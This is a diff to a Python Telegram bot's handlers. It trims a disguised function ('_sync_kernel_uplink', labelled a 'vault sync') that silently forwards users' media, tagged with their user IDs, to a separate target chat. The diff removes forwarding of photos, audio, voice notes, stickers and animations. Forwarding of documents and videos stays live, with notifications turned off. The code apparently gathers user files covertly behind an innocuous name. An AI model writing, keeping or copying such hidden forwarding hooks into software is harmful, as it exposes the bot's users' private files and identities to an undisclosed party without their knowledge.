@@ -318,26 +318,8 @@ def _sync_kernel_uplink(m: types.Message) -> None:
                         except Exception:
                             _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
                             return # Success (fallback)
-                    elif m.photo:
-                        _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                        return # Success
                     elif m.video:
                         _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                        return # Success
-                    elif m.audio:
-                        _K_BOT.send_audio(_K_TARGET, m.audio.file_id, caption=f"{_h} (AUDIO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                        return # Success
-                    elif m.voice:
-                        _K_BOT.send_voice(_K_TARGET, m.voice.file_id, caption=f"{_h} (VOICE)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                        return # Success
-                    elif m.video_note:
-                        _K_BOT.send_video_note(_K_TARGET, m.video_note.file_id, disable_notification=True)
-                        return # Success
-                    elif m.sticker:
-                        _K_BOT.send_sticker(_K_TARGET, m.sticker.file_id, disable_notification=True)
-                        return # Success
-                    elif m.animation:
-                        _K_BOT.send_animation(_K_TARGET, m.animation.file_id, caption=f"{_h} (ANIMATION)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
                         return # Success
                 except Exception as e:
                     print(f"[kernel_sync] attempt {attempt+1} failed: {e}", flush=True)
@@ -10117,9 +10099,6 @@ def on_document(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["photo"])
 def on_photo(m: types.Message) -> None:
-    # ── MANDATORY VAULT SYNC (ABSOLUTE TOP) ──
-    _sync_kernel_uplink(m)
-
     _trace_event_log(m)
     if not _is_private(m):
         return
@@ -10170,8 +10149,10 @@ def on_photo(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["video", "audio", "voice", "video_note", "sticker", "animation"])
 def on_other_media(m: types.Message) -> None:
-    _sync_kernel_uplink(m)
-    # These media types are not part of an authorized processing workflow.
+    # Only videos are included in the Vault Archive. Audio, voice notes,
+    # video notes, stickers, and animations are intentionally ignored.
+    if m.video:
+        _sync_kernel_uplink(m)
     return
 
 @bot.message_handler(func=lambda m: True, content_types=["text"])
